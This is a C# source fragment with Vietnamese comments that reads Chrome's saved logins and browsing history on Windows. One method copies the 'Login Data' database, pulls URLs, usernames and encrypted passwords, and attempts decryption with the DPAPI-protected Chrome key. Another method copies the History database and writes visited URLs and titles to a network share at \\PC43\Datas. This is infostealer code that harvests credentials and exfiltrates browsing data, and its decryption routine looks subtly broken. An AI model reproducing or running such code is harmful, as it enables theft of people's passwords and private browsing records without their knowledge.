        private void GetCookie()
        {
            string loginDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
               @"Google\Chrome\User Data\Default\Login Data");
            string destinationPath = @"D:\Login Data";
            if (File.Exists(loginDataPath))
            {
                File.Copy(loginDataPath, destinationPath, true);
                Console.WriteLine("File đã được sao chép đến D:.");
                using (var connection = new SQLiteConnection($"Data Source={destinationPath};Version=3;"))
                {
                    connection.Open();
                    var command = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", connection);
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string originUrl = reader["origin_url"].ToString();
                            string username = reader["username_value"].ToString();
                            byte[] encryptedPassword = (byte[])reader["password_value"];

                            // Kiểm tra kích thước của mật khẩu
                            Console.WriteLine($"Kích thước mật khẩu: {encryptedPassword.Length}");

                            if (encryptedPassword.Length > 0)
                            {
                                string password = DecryptPassword(encryptedPassword);
                                MessageBox.Show($"URL: {originUrl}, Username: {username}, Password: {password}");
                            }
                            else
                            {
                                MessageBox.Show("Mật khẩu không hợp lệ.");
                            }
                        }
                    }
                }
            }
            else
            {
                MessageBox.Show("File Login Data không tồn tại.");
            }
        }

        private string DecryptPassword(byte[] encryptedPassword)
        {
            if (encryptedPassword == null || encryptedPassword.Length == 0)
            {
                throw new ArgumentException("Dữ liệu mật khẩu không hợp lệ.");
            }

            byte[] key = GetChromeKey();

            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = new byte[16]; // IV mặc định

                try
                {
                    using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                    using (var ms = new MemoryStream(encryptedPassword))
                    using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    using (var reader = new StreamReader(cs))
                    {
                        return reader.ReadToEnd();
                    }
                }
                catch (CryptographicException ex)
                {
                    MessageBox.Show($"Lỗi giải mã: {ex.Message}");
                    return string.Empty;
                }
            }
        }

        private byte[] GetChromeKey()
        {
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var localStatePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Local State");

            string localState = File.ReadAllText(localStatePath);
            dynamic json = JsonConvert.DeserializeObject(localState);
            string base64Key = json["os_crypt"]["encrypted_key"].Value;

            byte[] encryptedKey = Convert.FromBase64String(base64Key);
            byte[] key = new byte[encryptedKey.Length - 5];
            Array.Copy(encryptedKey, 5, key, 0, key.Length);

            // Giải mã key với DPAPI
            return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
        }
        private void GetHistory()
        {
            // Đường dẫn đến file lịch sử của Chrome
            string chromeHistoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                @"Google\Chrome\User Data\Default\History");

            // Đường dẫn đến file sao chép trên ổ D
            string destinationPath = @"D:\ChromeHistory.db";

            // Sao chép file nếu nó tồn tại
            if (File.Exists(chromeHistoryPath))
            {
                File.Copy(chromeHistoryPath, destinationPath, true);
                Console.WriteLine("File đã được sao chép đến D:.");
                List<string> lstmeaagse = new List<string>();
                // Đọc nội dung từ file đã sao chép
                using (var connection = new SQLiteConnection($"Data Source={destinationPath};Version=3;"))
                {
                    connection.Open();
                    var command = new SQLiteCommand("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time", connection);
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            lstmeaagse.Add($"URL: {reader["url"]}, Title: {reader["title"]}, Visits: {reader["visit_count"]}" + "_");
                        }
                    }
                }
                try
                {
                    string computerName = Environment.MachineName;
                    string direct = @"\\PC43\Datas";
                    string baseFilePath = Path.Combine(direct, "file.txt");
                    string filePath = baseFilePath;
                    int fileIndex = 1;

                    // Kiểm tra xem file đã tồn tại chưa
                    while (File.Exists(filePath))
                    {
                        filePath = Path.Combine(Path.GetDirectoryName(baseFilePath),
                                                Path.GetFileNameWithoutExtension(baseFilePath) + "_" + fileIndex +
                                                Path.GetExtension(baseFilePath));
                        fileIndex++;
                    }

                    // Giả sử lstmeaagse là một List<string> chứa nội dung cần lưu 
                    try
                    {
                        // Tạo file và ghi nội dung
                        File.WriteAllLines(filePath, lstmeaagse);
                        Console.WriteLine($"Nội dung đã được lưu vào file thành công tại {filePath}!");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Lỗi khi tạo file: {ex.Message}");
                    }
                    File.Delete(destinationPath);
                }
                catch (Exception ex)
                {
                    // MessageBox.Show($"Lỗi khi xóa file: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine("File lịch sử của Chrome không tồn tại.");
            }
        }
